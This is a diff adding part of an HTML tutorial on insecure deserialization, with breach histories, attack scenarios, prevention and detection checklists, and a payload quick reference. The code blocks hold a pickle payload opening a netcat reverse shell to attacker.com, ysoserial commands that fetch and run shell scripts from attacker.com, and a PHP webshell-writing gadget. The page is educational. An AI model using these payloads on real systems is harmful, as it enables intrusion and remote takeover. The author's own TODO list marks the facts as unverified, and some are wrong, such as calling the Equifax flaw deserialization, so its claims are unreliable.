+<ul>
+    <li><strong>Impact:</strong> 147 million people affected, personal data exposed</li>
+    <li><strong>Method:</strong> Deserialization vulnerability in Jakarta Multipart parser (CVE-2017-5638)</li>
+    <li><strong>Cost:</strong> $1.4 billion in settlements and remediation [VERIFY SOURCE]</li>
+    <li><strong>Technical:</strong> Exploited Content-Type header to execute arbitrary code</li>
+</ul>
+
+<h4>2. Jenkins RCE (Multiple instances, 2015-2019)</h4>
+<ul>
+    <li><strong>Impact:</strong> Remote code execution on build servers</li>
+    <li><strong>Method:</strong> Java deserialization in CLI protocol and remoting</li>
+    <li><strong>CVEs:</strong> CVE-2015-8103, CVE-2016-0792, CVE-2017-1000353</li>
+    <li><strong>Exploitation:</strong> Unauthenticated RCE via crafted serialized objects</li>
+</ul>
+
+<h4>3. WebLogic Server RCE (2019-2020)</h4>
+<ul>
+    <li><strong>Impact:</strong> Critical RCE in Oracle WebLogic</li>
+    <li><strong>Method:</strong> T3 protocol deserialization (CVE-2019-2725, CVE-2020-2883)</li>
+    <li><strong>Scope:</strong> Thousands of internet-facing servers vulnerable</li>
+    <li><strong>Attack:</strong> Used in cryptocurrency mining and ransomware campaigns</li>
+</ul>
+
+<h4>4. Apache Commons Collections (2015)</h4>
+<ul>
+    <li><strong>Impact:</strong> Widespread RCE affecting numerous Java applications</li>
+    <li><strong>Method:</strong> InvokerTransformer gadget chain</li>
+    <li><strong>Affected:</strong> Applications using Commons Collections 3.x and 4.x</li>
+    <li><strong>Discovery:</strong> Revolutionized understanding of Java deserialization attacks</li>
+</ul>
+
+<h4>5. Rails YAML Deserialization (2013)</h4>
+<ul>
+    <li><strong>Impact:</strong> RCE in Ruby on Rails applications (CVE-2013-0156)</li>
+    <li><strong>Method:</strong> YAML deserialization in parameter parsing</li>
+    <li><strong>Affected:</strong> Rails versions before 2.3.15, 3.0.x, 3.1.x, 3.2.x</li>
+    <li><strong>Exploitation:</strong> Send YAML payload in Content-Type header</li>
+</ul>
+
+<h3>Common Vulnerable Applications</h3>
+
+<ul>
+    <li><strong>Java Enterprise Applications:</strong> Using native serialization for session management</li>
+    <li><strong>Message Queues:</strong> RabbitMQ, ActiveMQ deserializing untrusted messages</li>
+    <li><strong>Caching Systems:</strong> Memcached, Redis with insecure deserialization</li>
+    <li><strong>RMI/JMX Services:</strong> Remote Method Invocation endpoints</li>
+    <li><strong>Web Frameworks:</strong> Struts, Spring, Rails with vulnerable versions</li>
+    <li><strong>API Gateways:</strong> Deserializing tokens or session data</li>
+</ul>
+
+<h3>Attack Scenarios</h3>
+
+<h4>Scenario 1: Session Token Manipulation</h4>
+<pre><code># Application stores serialized user object in cookie
+Cookie: session=rO0ABXNyABljb20uZXhhbXBsZS5Vc2Vy...
+
+# Attacker decodes, modifies role from 'user' to 'admin'
+# Re-serializes and replaces cookie
+# Gains administrative access
+</code></pre>
+
+<h4>Scenario 2: API Token Forgery</h4>
+<pre><code class="language-python"># API uses pickle for JWT-like tokens
+import pickle
+import base64
+
+token_data = {'user_id': 1, 'role': 'user'}
+token = base64.b64encode(pickle.dumps(token_data))
+
+# Attacker creates malicious token with RCE payload
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('nc attacker.com 4444 -e /bin/bash',))
+
+malicious_token = base64.b64encode(pickle.dumps(Exploit()))
+# Send in Authorization header → RCE when deserialized
+</code></pre>
+
+<h4>Scenario 3: File Upload with Serialized Metadata</h4>
+<pre><code class="language-php">// Application accepts uploaded files with metadata
+&lt;?php
+$metadata = unserialize($_POST['file_metadata']);
+$file_path = $metadata->path;
+$file_owner = $metadata->owner;
+
+// Attacker uploads file with malicious metadata
+// Metadata contains object with __destruct() writing webshell
+?&gt;
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-7">
+            <h2>Quick Reference</h2>
+
+<h3>Common Payloads by Platform</h3>
+
+<h4>Java</h4>
+<pre><code class="language-bash"># Using ysoserial
+java -jar ysoserial.jar CommonsCollections1 "ping attacker.com"
+java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/shell.sh | bash"
+java -jar ysoserial.jar Spring1 "wget http://attacker.com/backdoor"
+java -jar ysoserial.jar Jdk7u21 "calc.exe"
+</code></pre>
+
+<h4>Python</h4>
+<pre><code class="language-python"># Pickle RCE
+import pickle, os, base64
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+print(base64.b64encode(pickle.dumps(Exploit())))
+</code></pre>
+
+<h4>PHP</h4>
+<pre><code class="language-php">// Object injection payload
+O:4:"User":2:{s:8:"isAdmin";b:1;s:8:"username";s:5:"admin";}
+
+// File write gadget
+O:6:"Logger":2:{s:4:"file";s:10:"/tmp/shell.php";s:4:"data";s:18:"&lt;?php phpinfo(); ?&gt;";}
+</code></pre>
+
+<h4>.NET</h4>
+<pre><code class="language-bash"># Using ysoserial.net
+ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "powershell -enc [base64]"
+ysoserial.exe -f SoapFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
+</code></pre>
+
+<h3>Testing Checklist</h3>
+<ul>
+    <li>☐ Identify serialized data in cookies, tokens, parameters</li>
+    <li>☐ Determine serialization format (Java, PHP, Python, .NET)</li>
+    <li>☐ Test with malformed data to trigger exceptions</li>
+    <li>☐ Attempt to modify serialized objects (privilege escalation)</li>
+    <li>☐ Generate exploit payloads with ysoserial/phpggc</li>
+    <li>☐ Test for out-of-band callbacks (DNS/HTTP)</li>
+    <li>☐ Try different gadget chains if first attempts fail</li>
+    <li>☐ Check for signature/encryption on serialized data</li>
+    <li>☐ Test second-order deserialization vulnerabilities</li>
+    <li>☐ Review dependencies for vulnerable libraries</li>
+</ul>
+
+<h3>Prevention Checklist</h3>
+<ul>
+    <li>☐ Avoid deserializing untrusted data</li>
+    <li>☐ Use JSON/MessagePack instead of native serialization</li>
+    <li>☐ Implement HMAC signatures on serialized data</li>
+    <li>☐ Use type whitelisting for allowed classes</li>
+    <li>☐ Run deserialization in isolated/sandboxed environment</li>
+    <li>☐ Monitor and log all deserialization operations</li>
+    <li>☐ Update vulnerable libraries (Commons Collections, etc.)</li>
+    <li>☐ Use safe alternatives (yaml.safe_load, JSON only)</li>
+    <li>☐ Implement integrity checks before deserialization</li>
+    <li>☐ Regular security testing and code review</li>
+    <li>☐ Use SAST tools to detect vulnerable patterns</li>
+    <li>☐ Educate developers on deserialization risks</li>
+</ul>
+
+<h3>Vulnerable Libraries to Watch</h3>
+<ul>
+    <li><strong>Java:</strong> commons-collections &lt; 3.2.2, commons-beanutils, groovy, XStream &lt; 1.4.17</li>
+    <li><strong>Python:</strong> PyYAML (use safe_load), pickle (never with untrusted data)</li>
+    <li><strong>PHP:</strong> Any use of unserialize() with user input</li>
+    <li><strong>.NET:</strong> BinaryFormatter, SoapFormatter, ObjectStateFormatter</li>
+    <li><strong>Ruby:</strong> Marshal, YAML.load (use YAML.safe_load)</li>
+    <li><strong>Node.js:</strong> node-serialize, serialize-to-js</li>
+</ul>
+
+<h3>Detection Patterns</h3>
+<pre><code># Serialized object signatures
+rO0AB          # Java (base64)
+AAEAAAD        # .NET BinaryFormatter (base64)
+0xACED0005     # Java (hex)
+O:             # PHP object
+a:             # PHP array
+gASV           # Python pickle (protocol 4)
+\x80\x04       # Python pickle (hex)
+!!python/      # Python YAML unsafe
+</code></pre>
+
+<h3>Resources</h3>
+<ul>
+    <li><a href="https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data">OWASP Deserialization</a></li>
+    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP Deserialization Cheat Sheet</a></li>
+    <li><a href="https://github.com/frohoff/ysoserial">ysoserial - Java deserialization tool</a></li>
+    <li><a href="https://github.com/pwntester/ysoserial.net">ysoserial.net - .NET deserialization tool</a></li>
+    <li><a href="https://github.com/ambionics/phpggc">phpggc - PHP gadget chains</a></li>
+    <li><a href="https://portswigger.net/web-security/deserialization">PortSwigger Deserialization</a></li>
+</ul>
+
+        </div>
+        
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-csharp.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ruby.min.js"></script>
+</body>
+</html>
+
+<!-- 
+TODO - VERIFICATION ITEMS:
+1. Verify ysoserial tool name and exact usage syntax
+2. Verify Equifax breach cost figure ($1.4 billion)
+3. Verify specific CVE numbers mentioned (CVE-2017-5638, etc.)
+4. Verify Apache Commons Collections vulnerable version numbers
+5. Verify XStream vulnerable version (< 1.4.17)
+6. Verify PyYAML safe version (>= 5.4)
+7. Verify exact payload formats for all platforms
+8. Verify gadget chain names (CommonsCollections1, Spring1, etc.)
+9. Verify Jenkins CVE numbers (CVE-2015-8103, CVE-2016-0792, CVE-2017-1000353)
+10. Verify Rails CVE-2013-0156 details
+11. Verify WebLogic CVE numbers (CVE-2019-2725, CVE-2020-2883)
+12. Verify all external tool links and availability
+13. Verify syntax of all code examples across platforms
+14. Verify OWASP ranking changes between 2017 and 2021
+15. Review all technical claims for accuracy
+-->
